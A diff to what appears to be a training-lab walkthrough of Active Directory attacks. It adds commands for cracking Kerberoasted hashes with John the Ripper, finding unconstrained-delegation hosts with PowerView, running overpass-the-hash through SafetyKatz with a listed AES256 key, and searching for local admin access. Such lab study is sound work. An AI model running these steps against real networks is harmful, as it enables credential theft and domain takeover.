@@ -1745,3 +1745,57 @@ C:\AD\Tools\Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\A
 
 
 ![](https://i.imgur.com/uxUMZQg.png)
+
+
+- We can then run the below command after making above changes -:
+
+
+```powershell
+C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
+```
+
+
+![](https://i.imgur.com/VsPwFaB.png)
+
+
+### **Locate `dcorp` Domain Server with Unconstrained Delegation Enabled.**
+
+
+- Find server with unconstrained delegation
+
+
+```powershell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat 
+
+. C:\AD\Tools\PowerView.ps1 
+
+Get-DomainComputer -Unconstrained | select -ExpandProperty name
+```
+
+
+![](https://i.imgur.com/X1AveOc.png)
+
+
+> **Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on `appsrv`. Recall that we extracted secrets of `appadmin`, `srvadmin` and `websvc` from `dcorp-adminsrv`. Let’s check if anyone of them have local admin privileges on `dcorp-appsrv`.**
+
+
+
+
+- First, we will try with `appadmin`. Run the below command from an elevated command prompt -:
+
+
+```powershell
+C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "sekurlsa::opassth /user:appadmin /domain:dollarcorp.moneycorp.local /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /run:cmd.exe" "exit"
+```
+
+
+- Run the below commands in the new process:
+
+
+```powershell
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat 
+
+. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1 
+
+Find-PSRemotingLocalAdminAccess
+```
